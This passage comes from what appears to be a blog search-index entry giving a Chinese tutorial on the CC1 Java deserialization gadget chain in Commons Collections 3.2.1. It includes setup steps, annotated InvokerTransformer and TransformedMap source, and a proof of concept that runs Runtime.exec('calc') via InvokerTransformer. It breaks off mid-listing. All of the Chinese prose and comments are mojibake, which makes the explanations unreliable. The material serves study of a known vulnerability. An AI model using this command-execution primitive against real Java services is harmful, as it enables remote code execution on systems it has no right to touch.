      <tag>java å­¦ä¹ </tag>
      
      <tag>CCé“¾</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CC1</title>
    <link href="/2025/08/30/CC1/"/>
    <url>/2025/08/30/CC1/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><h2 id="1ã€JDK-8u65"><a href="#1ã€JDK-8u65" class="headerlink" title="1ã€JDK-8u65"></a>1ã€JDK-8u65</h2><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html?utm_source=chatgpt.com">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><p><strong>æ³¨æ„ï¼šå›½å®¶ä¸è¦é€‰ä¸ºå›½åŒºï¼Œå›½åŒºå¯¹åº”çš„ 8u65 ä¸‹è½½çš„æ—¶å€™ä¼šè‡ªåŠ¨ä¸‹è½½ 8u111 ç­‰é«˜ç‰ˆæœ¬ï¼</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805704.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805734.png"></p><h2 id="2ã€Maven-commons-collections-3-2-1"><a href="#2ã€Maven-commons-collections-3-2-1" class="headerlink" title="2ã€Maven-commons-collections 3.2.1"></a>2ã€Maven-commons-collections 3.2.1</h2><p><a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.2.1</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="3ã€ä¿®æ”¹-sun-åŒ…-æ–¹ä¾¿è°ƒè¯•"><a href="#3ã€ä¿®æ”¹-sun-åŒ…-æ–¹ä¾¿è°ƒè¯•" class="headerlink" title="3ã€ä¿®æ”¹ sun åŒ…-æ–¹ä¾¿è°ƒè¯•"></a>3ã€ä¿®æ”¹ sun åŒ…-æ–¹ä¾¿è°ƒè¯•</h2><p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805174.png"></p><p>å°† jdk-af660750b2f4\jdk-af660750b2f4\src\share\classes\sun</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805660.png"></p><p>æ”¾å…¥ï¼šjdk1.8.0_65\src</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805980.png"></p><p><font style="color:rgb(102, 102, 102);">æŠŠ src æ–‡ä»¶å¤¹æ·»åŠ åˆ°æºè·¯å¾„ä¸‹</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805831.png"></p><h1 id="Apache-Commons-CollectionsåŒ…å’Œç®€ä»‹"><a href="#Apache-Commons-CollectionsåŒ…å’Œç®€ä»‹" class="headerlink" title="Apache Commons CollectionsåŒ…å’Œç®€ä»‹:"></a>Apache Commons CollectionsåŒ…å’Œç®€ä»‹:</h1><p><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/</a></p><h1 id="CC1é“¾åˆ†æï¼š"><a href="#CC1é“¾åˆ†æï¼š" class="headerlink" title="CC1é“¾åˆ†æï¼š"></a>CC1é“¾åˆ†æï¼š</h1><p>é¦–å…ˆè¦æ˜ç™½ï¼ŒCC1 é“¾çš„æºå¤´æ˜¯ Commons Collections åº“ä¸­çš„ Tranformer ï¼ˆ org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;Transformer.java ï¼‰æ¥å£ä¸­çš„ transform æ–¹æ³•ï¼Œè¿™ä¸ªæ¥å£çš„è®¾è®¡åˆè¡·ï¼Œæ˜¯ä¸ºäº†æŠŠä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆå¦ä¸€ä¸ªå¯¹è±¡ï¼Œ ä½†æ˜¯ï¼Œåœ¨å®ç°ç±»é‡ŒæŠŠ transform å˜æˆâ€œå¯ä»¥æ‰§è¡Œä»»æ„é€»è¾‘â€æ—¶ï¼Œå°±å‡ºç°äº†æ¼æ´ã€‚</p><p>è¿™æ ·çš„ç±»æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><p><strong>æœ€æ ¸å¿ƒã€æœ€å±é™©çš„ç±»</strong>ï¼š</p><ul><li><code>InvokerTransformer</code> ï¼ˆæ‰§è¡Œä»»æ„æ–¹æ³•ï¼Œå‘½ä»¤æ‰§è¡Œï¼‰</li><li><code>InstantiateTransformer</code> ï¼ˆå®ä¾‹åŒ–ä»»æ„ç±»ï¼Œæ„é€ å‡½æ•°è§¦å‘å±é™©é€»è¾‘ï¼‰</li></ul><p> <strong>ç»„åˆè¾…åŠ©ç±»ï¼ˆè§¦å‘é“¾æ¡çš„å…³é”®ï¼‰</strong>ï¼š</p><ul><li><code>ChainedTransformer</code>ï¼ˆç»„åˆæ‰§è¡Œå™¨ï¼‰</li><li><code>LazyMap</code>ï¼ˆè§¦å‘å…¥å£ï¼‰</li></ul><h2 id="1ã€-TransformedMap-ç‰ˆ"><a href="#1ã€-TransformedMap-ç‰ˆ" class="headerlink" title="1ã€ TransformedMap ç‰ˆ"></a>1ã€ TransformedMap ç‰ˆ</h2><blockquote><p><strong>ã€ŠJava å®‰å…¨æ¼«è°ˆã€‹</strong></p><p><strong>TransformedMapçš„å‡ºå¤„</strong></p><p>æ—¢ç„¶ysoserialä¸­æ²¡æœ‰ç”¨åˆ°TransformedMapï¼Œé‚£ä¹ˆTransformedMapç©¶ç«Ÿæ˜¯è°æœ€å…ˆæå‡ºæ¥çš„å‘¢ï¼Ÿ</p><p>æ®æˆ‘çš„è€ƒè¯ï¼Œæœ€æ—©è®²åˆ°TransformedMapåº”è¯¥æ˜¯Code Whiteçš„è¿™ç¯‡Slideï¼šExploiting</p><p>Deserialization Vulnerabilities in Java(<a href="https://www.slideshare.net/slideshow/exploiting-deserialization-vulnerabilities-in-java-54707478/54707478">https://www.slideshare.net/slideshow/exploiting-deserialization-vulnerabilities-in-java-54707478/54707478</a>)1ï¼Œåæ¥é•¿äº­ç§‘æŠ€çš„åšå®¢æ–‡ç« ã€ŠLibä¹‹è¿‡ï¼ŸJavaååºåˆ—åŒ–æ¼æ´é€šç”¨åˆ©ç”¨åˆ†æã€‹ï¼ˆ<a href="https://www.anquanke.com/post/id/82898">https://www.anquanke.com/post/id/82898</a> åŸæ–‡ç½‘ç«™è¿›ä¸å»äº†ï¼Œåªæœ‰è½¬è½½ï¼‰å¯¹æ­¤è¿›è¡Œäº†è¿›ä¸€æ­¥åˆ†æï¼Œåæ¥æ‰åœ¨å›½å†…ä¼—å¤šæ–‡ç« ä¸­è¢«è®²åˆ°ã€‚</p></blockquote><h3 id="1-1-æ¼æ´åˆ©ç”¨"><a href="#1-1-æ¼æ´åˆ©ç”¨" class="headerlink" title="1.1 æ¼æ´åˆ©ç”¨"></a>1.1 æ¼æ´åˆ©ç”¨</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311805576.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806717.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokerTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">8653385846894047688L</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String iMethodName;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Class[] iParamTypes;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object[] iArgs;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Transformer <span class="hljs-title function_">getInstance</span><span class="hljs-params">(String methodName)</span> &#123;<br>        <span class="hljs-keyword">if</span> (methodName == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;The method to invoke must not be null&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(methodName);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Transformer <span class="hljs-title function_">getInstance</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>        <span class="hljs-keyword">if</span> (methodName == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;The method to invoke must not be null&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (((paramTypes == <span class="hljs-literal">null</span>) &amp;&amp; (args != <span class="hljs-literal">null</span>))<br>            || ((paramTypes != <span class="hljs-literal">null</span>) &amp;&amp; (args == <span class="hljs-literal">null</span>))<br>            || ((paramTypes != <span class="hljs-literal">null</span>) &amp;&amp; (args != <span class="hljs-literal">null</span>) &amp;&amp; (paramTypes.length != args.length))) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;The parameter types must match the arguments&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (paramTypes == <span class="hljs-literal">null</span> || paramTypes.length == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(methodName);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            paramTypes = (Class[]) paramTypes.clone();<br>            args = (Object[]) args.clone();<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(methodName, paramTypes, args);<br>        &#125;<br>    &#125;<br><br> <br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = <span class="hljs-literal">null</span>;<br>        iArgs = <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br>    &#125;<br><br>    <span class="hljs-comment">//å®ç° Transformer æ¥å£ï¼Œé‡å†™çš„transformæ–¹æ³•ï¼ŒæŠŠä¼ å…¥çš„å¯¹è±¡ input è½¬æ¢æˆå¦ä¸€ä¸ªå¯¹è±¡</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//è·å–ä¼ å…¥å¯¹è±¡çš„è¿è¡Œæ—¶ç±»</span><br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>            <span class="hljs-comment">//ä» cls ç±»ä¸­ï¼Œåå°„è·å–ä¸€ä¸ªæ–¹æ³•å¯¹è±¡ï¼›iMethodNameï¼šæ„é€  InvokerTransformer æ—¶ä¼ å…¥çš„ç›®æ ‡æ–¹æ³•åï¼ˆå¯æ§ï¼‰ï¼›iParamTypesï¼šæ–¹æ³•çš„å‚æ•°ç±»å‹æ•°ç»„ï¼ˆå¯æ§ï¼‰</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<br>            <span class="hljs-comment">//è°ƒç”¨ä¸Šä¸€æ­¥æ‹¿åˆ°çš„ methodï¼Œå¹¶ä¼ å…¥å‚æ•° iArgsï¼ˆå¯æ§ï¼‰</span><br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>                <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException ex) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; does not exist&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException ex) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; cannot be accessed&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; threw an exception&quot;</span>, ex);<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ä»æºç ä¸­å¯çŸ¥å­˜åœ¨åå°„è°ƒç”¨ä»»æ„ç±»ï¼Œå¹¶ä¸”å„ä¸ªå‚æ•°éƒ½æ˜¯å¯æ§çš„ï¼Œä½¿ç”¨åå°„è°ƒç”¨ Runtime.exec ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><span class="hljs-comment">//æ–¹æ³•åä¸ºexecï¼Œå‚æ•°ç±»å‹ä¸ºStringï¼Œå‚æ•°å€¼ä¸ºcalc</span><br><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>    <span class="hljs-string">&quot;exec&quot;</span>,<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>);<br>invokerTransformer.transform(r);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806892.png"></p><h3 id="1-2-åˆ†ææ¼æ´é“¾"><a href="#1-2-åˆ†ææ¼æ´é“¾" class="headerlink" title="1.2 åˆ†ææ¼æ´é“¾"></a>1.2 åˆ†ææ¼æ´é“¾</h3><p>ç°åœ¨æˆ‘ä»¬çŸ¥é“äº†<code>InvokerTransformer.transform()</code> æ–¹æ³•èƒ½æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä½†æ˜¯å®ƒè‡ªå·±ä¸ä¼šå¹³ç™½æ— æ•…è¢«è°ƒç”¨ï¼Œå¿…é¡»æœ‰åˆ«çš„ç±»&#x2F;æ–¹æ³•è°ƒç”¨å®ƒï¼Œ æˆ‘ä»¬å°±å»æ‰¾å“ªäº›ç±»ä¼šåœ¨æ­£å¸¸é€»è¾‘ä¸­è°ƒç”¨ <code>transform</code>**ã€‚**å¦‚æœæœ‰å“ªä¸ªç±»è°ƒç”¨äº† <code>transform</code>ï¼Œ å°±ç­‰äºæ‰¾åˆ°äº†ä¸€ä¸ªâ€œå…¥å£ç‚¹â€ï¼Œåªè¦æˆ‘ä»¬èƒ½æ§åˆ¶ä¼ è¿›å»çš„ Transformerï¼Œå°±èƒ½è®©åº”ç”¨åœ¨â€œæ­£å¸¸ä½¿ç”¨ Mapâ€çš„æ—¶å€™ï¼Œè‡ªåŠ¨è°ƒç”¨åˆ°æˆ‘ä»¬çš„æ¶æ„ <code>transform</code> ï¼Œä»è€Œæ‰§è¡Œå‘½ä»¤ ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806070.png"></p><p>åœ¨ <code>TransformedMap</code>ç±»ä¸­æ‰¾åˆ° <code>checkSetValue()</code>æ–¹æ³•è°ƒç”¨äº† <code>transform()</code>æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311806968.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedMap</span><br>    <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractInputCheckedMapDecorator</span><br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-comment">/** Serialization version */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">7023152376788900464L</span>;<br><br>    <span class="hljs-comment">/** The transformer to use for the key */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer keyTransformer;<br>    <span class="hljs-comment">/** The transformer to use for the value */</span><br>    <span class="hljs-comment">//è‹¥æŠŠ valueTransformer è®¾ä¸º InvokerTransformerï¼Œå½“å®ƒè¢«è°ƒç”¨ transform() æ—¶å°±èƒ½æ‰§è¡Œä»»æ„æ–¹æ³•/å‘½ä»¤</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer valueTransformer;<br><br>    <span class="hljs-comment">//decorate(è£…é¥°)ï¼ŒæŠŠä¸€ä¸ªå·²ç»å­˜åœ¨çš„ Map åŒ…ä¸€å±‚ TransformedMap,ä»¥åå¯¹è¿™ä¸ª Map åšçš„æ“ä½œï¼ˆæ¯”å¦‚ putï¼‰ï¼Œå°±ä¼šå…ˆç»è¿‡ Transformer å¤„ç†ï¼Œå†çœŸæ­£å­˜è¿›å»</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>    &#125;<br><br>    <span class="hljs-comment">//å¦ä¸€ç§è£…é¥°ï¼Œdecorateï¼šåŒ…è£…ï¼Œä¸æ”¹å·²æœ‰æ•°æ®ï¼›decorateTransformï¼šå…ˆæ”¹æ—§æ•°æ®å†åŒ…è£…</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorateTransform</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-type">TransformedMap</span> <span class="hljs-variable">decorated</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>        <span class="hljs-keyword">if</span> (map.size() &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">Map</span> <span class="hljs-variable">transformed</span> <span class="hljs-operator">=</span> decorated.transformMap(map);<br>            decorated.clear();<br>            decorated.getMap().putAll(transformed);  <span class="hljs-comment">// avoids double transformation</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> decorated;<br>    &#125;<br><br>    <span class="hljs-comment">//ä¿å­˜åº•å±‚ map å’Œä¸¤ä¸ª transformer;valueTransformer æ˜¯æˆ‘ä»¬éœ€è¦çš„å…³é”®ç‚¹</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>    &#125;<br><br>    <span class="hljs-comment">//è‡ªå®šä¹‰åºåˆ—åŒ–ï¼Œè¿™é‡Œçš„ readObject å¹¶ä¸ä¼šä¸»åŠ¨è§¦å‘ transformerï¼›å®ƒåªæ˜¯æŠŠç»“æ„æ¢å¤</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        out.defaultWriteObject();<br>        out.writeObject(map);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        in.defaultReadObject();<br>        map = (Map) in.readObject();<br>    &#125;<br><br>    <span class="hljs-comment">//è‹¥æœ‰ keyTransformer åˆ™å¯¹ key åšå˜æ¢ï¼›è¿™é‡Œçš„â€œå˜æ¢â€ï¼Œåœ¨æ­£å¸¸æƒ…å†µä¸‹æ˜¯å¯¹ key/value åšæŸç§è½¬æ¢ï¼ˆå¦‚ï¼šå¤§å°å†™è½¬æ¢ï¼‰ï¼Œä½†åœ¨æ¼æ´åˆ©ç”¨æ—¶ï¼Œâ€œå˜æ¢â€å°±æ‰§è¡Œäº†æ”»å‡»è€…çš„ä»£ç </span><br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">transformKey</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">if</span> (keyTransformer == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> object;<br>        &#125;<br>        <span class="hljs-keyword">return</span> keyTransformer.transform(object);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">transformValue</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">if</span> (valueTransformer == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> object;<br>        &#125;<br>        <span class="hljs-keyword">return</span> valueTransformer.transform(object);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Map <span class="hljs-title function_">transformMap</span><span class="hljs-params">(Map map)</span> &#123;<br>        <span class="hljs-keyword">if</span> (map.isEmpty()) &#123;<br>            <span class="hljs-keyword">return</span> map;<br>        &#125;<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedMap</span>(map.size());<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">Iterator</span> <span class="hljs-variable">it</span> <span class="hljs-operator">=</span> map.entrySet().iterator(); it.hasNext(); ) &#123;<br>            Map.<span class="hljs-type">Entry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> (Map.Entry) it.next();<br>            result.put(transformKey(entry.getKey()), transformValue(entry.getValue()));<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-comment">//è¿™é‡Œç›´æ¥è°ƒç”¨äº† valueTransformer.transform(value)</span><br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;<br>        <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSetValueChecking</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> (valueTransformer != <span class="hljs-literal">null</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//-----------------------------------------------------------------------</span><br>    <span 